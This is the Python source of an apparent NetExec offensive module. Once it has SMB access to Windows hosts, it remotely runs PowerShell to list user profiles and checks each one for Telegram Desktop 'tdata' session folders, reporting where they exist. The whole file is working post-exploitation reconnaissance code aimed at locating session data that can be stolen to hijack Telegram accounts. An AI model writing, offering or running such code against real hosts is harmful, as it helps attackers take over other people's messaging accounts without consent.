# -*- coding: utf-8 -*-

class NXCModule:
    name = 'telegram'
    description = "Enumerate tdata from Telegram Desktop"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True  

    def options(self, context, module_options):
        """"""

    def on_login(self, context, connection):
        ip = connection.host
        context.log.highlight(f"[*] Enumerating Telegram Desktop tdata on {ip}")
        
        try:
            users_list_cmd = 'powershell -Command "Get-ChildItem C:\\Users | Where-Object { $_.PSIsContainer } | Select-Object -ExpandProperty Name"'
            users_raw = connection.execute(users_list_cmd, True)
            users = [u.strip() for u in users_raw.splitlines() if u.strip()]
        except Exception as e:
            context.log.error(f"[!] Failed to enumerate users on {ip}: {e}")
            return

        if not users:
            context.log.error(f"[-] No users found on {ip}")
            return

        for username in users:
            tdata_path = f"C:\\Users\\{username}\\AppData\\Roaming\\Telegram Desktop\\tdata"
            
            check_cmd = f'powershell -Command "Test-Path \'{tdata_path}\'"'
            exists = connection.execute(check_cmd, True).strip()
            
            if exists.lower() == 'true':
                context.log.highlight(f"[+] Found tdata for {username}")
                continue
